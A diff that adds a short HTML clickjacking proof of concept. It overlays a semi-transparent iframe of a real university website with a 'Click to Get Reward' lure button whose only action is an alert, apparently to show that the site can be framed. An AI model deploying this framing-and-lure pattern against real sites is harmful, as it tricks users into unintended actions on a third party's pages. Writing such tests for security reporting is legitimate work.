@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Test</title>
+  <style>
+    iframe {
+      position: absolute;
+      top: 50px;
+      left: 50px;
+      width: 900px;
+      height: 700px;
+      opacity: 0.2; /* Make it semi-transparent */
+      z-index: 2;
+    }
+    button {
+      position: absolute;
+      top: 130px;
+      left: 110px;
+      z-index: 3;
+      font-size: 18px;
+      padding: 10px 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>This is a Clickjacking Proof of Concept</h2>
+  <button onclick="alert('Clickjack triggered!')">Click to Get Reward</button>
+  <iframe src="https://daffodilvarsity.edu.bd"></iframe>
+</body>
+</html>
